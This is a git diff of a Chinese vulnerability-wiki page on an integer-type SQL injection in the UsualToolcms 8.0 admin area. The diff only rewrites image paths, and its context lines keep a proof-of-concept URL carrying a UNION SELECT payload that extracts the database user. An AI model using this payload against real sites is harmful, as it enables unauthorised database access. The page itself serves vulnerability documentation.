@@ -16,13 +16,13 @@ UsualToolcms 8.0
 
 该php文件下另外一个触发点：
 
-![2.png](/Users/aresx/Documents/VulWiki/.resource/UsualToolcms8.0a_users_level.php后台int型注入/media/rId24.png)
+![2.png](./.resource/UsualToolcms8.0a_users_level.php后台int型注入/media/rId24.png)
 
 ### poc
 
     http://www.0-sec.org/cmsadmin/a_book_category.php?t=mon&id=-1%20union%20select%201,user(),3%23
 
-![2.png](/Users/aresx/Documents/VulWiki/.resource/UsualToolcms8.0a_users_level.php后台int型注入/media/rId26.png)
+![2.png](./.resource/UsualToolcms8.0a_users_level.php后台int型注入/media/rId26.png)
 
 参考链接
 --------
